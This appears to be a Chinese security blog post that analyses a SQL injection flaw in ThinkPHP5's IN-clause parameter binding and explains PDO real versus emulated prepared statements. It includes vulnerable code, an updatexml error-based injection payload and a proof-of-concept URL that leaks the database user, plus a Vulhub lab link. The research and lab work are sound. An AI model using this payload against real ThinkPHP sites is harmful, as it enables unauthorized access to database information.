> 原文链接: https://www.anquanke.com//post/id/86376 


# 【技术分享】ThinkPHP5 SQL注入漏洞 &amp;&amp; PDO真/伪预处理分析


                                阅读量   
                                **102821**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p4.ssl.qhimg.com/t01f4979c6330098e00.jpg)](https://p4.ssl.qhimg.com/t01f4979c6330098e00.jpg)

刚才先知分享了一个漏洞（ https://xianzhi.aliyun.com/forum/read/1813.html ），文中说到这是一个信息泄露漏洞，但经过我的分析，除了泄露信息以外，这里其实是一个（鸡肋）SQL注入漏洞，似乎是一个不允许子查询的SQL注入点。

漏洞上下文如下：



```
&lt;?php
namespace appindexcontroller;
use appindexmodelUser;
class Index
`{`
    public function index()
    `{`
        $ids = input('ids/a');
        $t = new User();
        $result = $t-&gt;where('id', 'in', $ids)-&gt;select();
    `}`
`}`
```

如上述代码，如果我们控制了in语句的值位置，即可通过传入一个数组，来造成SQL注入漏洞。

文中已有分析，我就不多说了，但说一下为什么这是一个SQL注入漏洞。IN操作代码如下：



```
&lt;?php
...
$bindName = $bindName ?: 'where_' . str_replace(['.', '-'], '_', $field);
if (preg_match('/W/', $bindName)) `{`
    // 处理带非单词字符的字段名
    $bindName = md5($bindName);
`}`
...
`}` elseif (in_array($exp, ['NOT IN', 'IN'])) `{`
    // IN 查询
    if ($value instanceof Closure) `{`
        $whereStr .= $key . ' ' . $exp . ' ' . $this-&gt;parseClosure($value);
    `}` else `{`
        $value = is_array($value) ? $value : explode(',', $value);
        if (array_key_exists($field, $binds)) `{`
            $bind  = [];
            $array = [];
            foreach ($value as $k =&gt; $v) `{`
                if ($this-&gt;query-&gt;isBind($bindName . '_in_' . $k)) `{`
                    $bindKey = $bindName . '_in_' . uniqid() . '_' . $k;
                `}` else `{`
                    $bindKey = $bindName . '_in_' . $k;
                `}`
                $bind[$bindKey] = [$v, $bindType];
                $array[]        = ':' . $bindKey;
            `}`
            $this-&gt;query-&gt;bind($bind);
            $zone = implode(',', $array);
        `}` else `{`
            $zone = implode(',', $this-&gt;parseValue($value, $field));
        `}`
        $whereStr .= $key . ' ' . $exp . ' (' . (empty($zone) ? "''" : $zone) . ')';
    `}`
```

可见，$bindName在前边进行了一次检测，正常来说是不会出现漏洞的。但如果$value是一个数组的情况下，这里会遍历$value，并将$k拼接进$bindName。

也就是说，我们控制了预编译SQL语句中的键名，也就说我们控制了预编译的SQL语句，这理论上是一个SQL注入漏洞。那么，为什么原文中说测试SQL注入失败呢？

这就是涉及到预编译的执行过程了。通常，PDO预编译执行过程分三步：

prepare($SQL) 编译SQL语句

bindValue($param, $value) 将value绑定到param的位置上

execute() 执行

这个漏洞实际上就是控制了第二步的$param变量，这个变量如果是一个SQL语句的话，那么在第二步的时候是会抛出错误的：

[![](https://p5.ssl.qhimg.com/t010f97ff00c8509c7f.png)](https://p5.ssl.qhimg.com/t010f97ff00c8509c7f.png)

所以，这个错误“似乎”导致整个过程执行不到第三步，也就没法进行注入了。

但实际上，在预编译的时候，也就是第一步即可利用。我们可以做有一个实验。编写如下代码：



```
&lt;?php
$params = [
    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_EMULATE_PREPARES  =&gt; false,
];
$db = new PDO('mysql:dbname=cat;host=127.0.0.1;', 'root', 'root', $params);
try `{`
    $link = $db-&gt;prepare('SELECT * FROM table2 WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))');
`}` catch (PDOException $e) `{`
    var_dump($e);
`}`
```

执行发现，虽然我只调用了prepare函数，但原SQL语句中的报错已经成功执行：

[![](https://p1.ssl.qhimg.com/t010501f5fa073b8a6e.png)](https://p1.ssl.qhimg.com/t010501f5fa073b8a6e.png)

究其原因，是因为我这里设置了PDO::ATTR_EMULATE_PREPARES =&gt; false。

这个选项涉及到PDO的“预处理”机制：因为不是所有数据库驱动都支持SQL预编译，所以PDO存在“模拟预处理机制”。如果说开启了模拟预处理，那么PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行；如果我这里设置了PDO::ATTR_EMULATE_PREPARES =&gt; false，那么PDO不会模拟预处理，参数化绑定的整个过程都是和Mysql交互进行的。

非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing-&gt;resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization-&gt;execution）。

这时，假设在第一步执行prepare($SQL)的时候我的SQL语句就出现错误了，那么就会直接由mysql那边抛出异常，不会再执行第二步。我们看看ThinkPHP5的默认配置：



```
...
// PDO连接参数
protected $params = [
    PDO::ATTR_CASE              =&gt; PDO::CASE_NATURAL,
    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_ORACLE_NULLS      =&gt; PDO::NULL_NATURAL,
    PDO::ATTR_STRINGIFY_FETCHES =&gt; false,
    PDO::ATTR_EMULATE_PREPARES  =&gt; false,
];
...
```

可见，这里的确设置了PDO::ATTR_EMULATE_PREPARES =&gt; false。所以，终上所述，我构造如下POC，即可利用报错注入，获取user()信息：

[http://localhost/thinkphp5/public/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1231](http://localhost/thinkphp5/public/index.php?ids%5B0,updatexml(0,concat(0xa,user()),0)%5D=1231)

[![](https://p0.ssl.qhimg.com/t01ddb0775e2712e38e.png)](https://p0.ssl.qhimg.com/t01ddb0775e2712e38e.png)

但是，如果你将user()改成一个子查询语句，那么结果又会爆出Invalid parameter number: parameter was not defined的错误。因为没有过多研究，说一下我猜测：预编译的确是mysql服务端进行的，但是预编译的过程是不接触数据的 ，也就是说不会从表中将真实数据取出来，所以使用子查询的情况下不会触发报错；虽然预编译的过程不接触数据，但类似user()这样的数据库函数的值还是将会编译进SQL语句，所以这里执行并爆了出来。

总体来说，这个洞不是特别好用。期待有人能研究一下，推翻我的猜测，让这个漏洞真正好用起来。类似的触发SQL报错的位置我还看到另外一处，暂时就不说了。

我做了一个Vulhub的环境，大家可以自己测一测：[https://github.com/phith0n/vulhub/tree/master/thinkphp/in-sqlinjection](https://github.com/phith0n/vulhub/tree/master/thinkphp/in-sqlinjection) 




